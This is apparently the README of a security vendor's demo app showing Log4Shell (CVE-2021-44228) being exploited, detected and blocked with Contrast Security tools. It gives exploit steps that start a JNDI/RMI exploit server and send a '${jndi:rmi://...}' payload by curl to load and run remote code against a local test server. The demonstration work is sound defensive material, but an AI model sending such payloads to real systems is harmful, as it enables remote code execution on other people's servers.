# Introduction

This app is used to demonstrate the detection/protection of [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) using the Contrast Security platform.

The exploitation of this vulnerability can also be mitigated *pre-CVE* via **Contrast Protect**, specifically using the Expression Language Injection and Untrusted Deserialisation rules.

This vulnerability was indicated *pre-CVE* by **Contrast Assess** via the existing Log Injection rule and *post-CVE* via **Contrast OSS** which reports on the CVE and also the runtime class usage of this library by your app.

## Credits

The sever to serve the actual attacks is taken from [GitHub - welk1n/JNDI-Injection-Exploit](https://github.com/welk1n/JNDI-Injection-Exploit)

# Requirements

This demo has been tested against Java 1.8 (updates 151, 181, 191) on MacOS.

# Exploit Steps

1. Run `java -jar myproject-0.0.1-SNAPSHOT.jar` to start up the vulnerable spring boot server with log4j.

1. Run the following to start up the RMI server with payload:

    ```
    java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "open /System/Applications/Calculator.app"
    ```

1. Copy the RMI address for JDK 1.8 to your clipboard.

1. Paste the RMI address into the following curl request:

    ```
    curl --location --request POST 'http://localhost:8080/log' \
    --header 'Content-Type: text/plain' \
    --data-raw '${jndi:XXX}'
    ```

    **Change the "XXX" to your version of `rmi://ip:1099/token`**

1. The Calculator app should pop.

# Detection with Contrast Assess

1. Register for a free Contrast Community Edition (CE) account (if you do not have an existing account) here: https://www.contrastsecurity.com/contrast-community-edition.

1. Download the Contrast Java agent from [Maven](https://search.maven.org/artifact/com.contrastsecurity/contrast-agent) and place within the root of this folder.

1. Download a yaml configuration file for the agent to this folder from the Contrast UI > Add New button.

1. Run the following to start up the vulnerable spring boot server with log4j:

    ```
    java -javaagent:contrast.jar -Dcontrast.agent.java.standalone_app_name=log4j-demo -Dcontrast.config.path=contrast_security.yaml -Dcontrast.assess.enable=true -Dcontrast.protect.enable=true -Dcontrast.server.name=log4j -jar myproject-0.0.1-SNAPSHOT.jar
    ```

1. Ensure that the Log Injection rule is turned on in the Policy tab of the log4j-demo application in the Contrast UI.

1. To test detection with **Contrast Assess** (this is not an attack):

    ```
    curl --location --request POST 'http://localhost:8080/log' \
    --header 'Content-Type: text/plain' \
    --data-raw 'Harmless Log Message'
    ```

1. The Log Injection vulnerability should be visible within the Vulnerabilities tab of the log4j-demo application in the Contrast UI.

# Blocking with Contrast Protect

1. Follow steps 1-4 from the Contrast Assess section above to onboard the app.

1. Run the following command to start up the RMI server with payload:

    ```
    java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "open /System/Applications/Calculator.app"
    ```

1. Copy the RMI address for JDK 1.8 to your clipboard.

1. Run the following request. This uses RMI to load and invoke the remote code:

    ```
    curl --location --request POST 'http://localhost:8080/log' \
    --header 'Content-Type: text/plain' \
    --data-raw '${jndi:XXX}'
    ```

    **Change the "XXX" to your version of `rmi://ip:1099/token`**

1. The Calculator app should pop. After a few seconds the exploit should be visible within the Attacks tab in the Contrast UI.

1. Open the Contrast UI and locate the log4j-demo app. Go to the Policy tab, then Protect rules. Change the rules for Expression Language Injection and Untrusted Deserialization from "Monitor" to "Block" in all environments.

1. Restart the app and repeat the attack, the Calculator app should *NOT* open. After a few seconds the block should be visible within the Attacks tab in the Contrast UI.
